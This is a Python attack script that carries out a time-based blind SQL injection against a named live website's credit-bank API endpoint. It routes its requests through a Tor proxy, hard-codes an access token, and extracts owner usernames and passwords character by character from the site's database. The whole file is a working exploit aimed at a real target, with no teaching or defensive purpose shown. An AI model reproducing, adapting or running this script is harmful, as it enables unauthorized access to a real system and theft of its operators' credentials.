#!/usr/bin/env python3
"""Extract owners from kaichon_root via time-blind SQLi"""
import requests
import time

PROXY = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
URL = "https://cybermagic555.com/api/AddCreditBank"
TOKEN = "jbaLjsuBe4U7ihtQpRXmTXsXb"

def check(cond):
    payload = f"1' AND IF({cond},SLEEP(2),0)-- -"
    files = {"BankLogID": (None, payload), "AccessToken": (None, TOKEN)}
    start = time.time()
    try:
        requests.post(URL, files=files, proxies=PROXY, timeout=20)
    except:
        pass
    return (time.time() - start) > 3.5

def get_byte(query, pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if check(f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo if lo > 32 else 0

def get_string(query, max_len=30):
    result = ""
    for pos in range(1, max_len + 1):
        b = get_byte(query, pos)
        if b == 0 or b < 32:
            break
        result += chr(b)
        print(f"\r  > {result}", end="", flush=True)
    print()
    return result

# Count owners
print("[*] Counting owners...")
for n in range(1, 20):
    if check(f"(SELECT COUNT(*) FROM owner)={n}"):
        print(f"[+] {n} owners")
        break

# Extract each owner
print("\n[*] Extracting owners...")
for i in range(10):
    print(f"\nOwner {i}:")
    owner = get_string(f"SELECT Owner FROM owner LIMIT {i},1", 25)
    if not owner:
        break
    pwd = get_string(f"SELECT Pass FROM owner WHERE Owner='{owner}'", 20)
    print(f"  Owner: {owner}")
    print(f"  Pass: {pwd}")
